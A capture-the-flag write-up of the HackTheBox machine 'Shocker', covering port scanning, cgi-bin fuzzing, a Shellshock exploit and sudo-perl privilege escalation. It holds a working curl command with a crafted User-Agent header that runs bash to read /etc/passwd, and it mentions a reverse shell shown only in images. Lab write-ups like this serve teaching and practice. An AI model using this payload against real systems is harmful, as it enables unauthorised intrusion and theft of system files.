# HackTheBox-Shocker

## NMAP

```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)                
|_http-title: Site doesn't have a title (text/html).                
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gp
NcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQq
qj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9K
AtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

On the web server we only get a static html page

<img src="https://i.imgur.com/8O2skgK.png"/>

But there wasn't anything on this page , so after searching exploits for apache 2.4.18 , I saw a vulnerability called `shellshock`

<img src="https://i.imgur.com/jr3EQb4.png"/>

So maybe there's a folder `cgi-bin` on web server but on running `gobuster` and `dirsearch` it wasn't showing so I assumed it's on the webserver and I fuzz for files with the extensions `pl,rb,sh,py` 

<img src="https://i.imgur.com/hDewIfH.png"/>

We can see `user.sh` is in `cgi-bin` directory ,cgi-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. 

Now let's check if it's vulnerable to shellshock

```bash
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://10.10.10.56/cgi-bin/user.sh
```

<img src="https://i.imgur.com/1aPsX2v.png"/>

We can get a bash reverse shell

<img src="https://i.imgur.com/y0n9KwZ.png"/>

Now to escalate to a user , in this case we have only a root user to escalate to , we can check what we can run as sudo so in order to do that we'll run the command `sudo -l`

<img src="https://i.imgur.com/U4tkxxP.png"/>

We can run `perl` as root so let's visit GTFOBINS to see how we can abuse this

<img src="https://i.imgur.com/aJDG7Lf.png"/>

<img src="https://i.imgur.com/Pno3Xf4.png"/>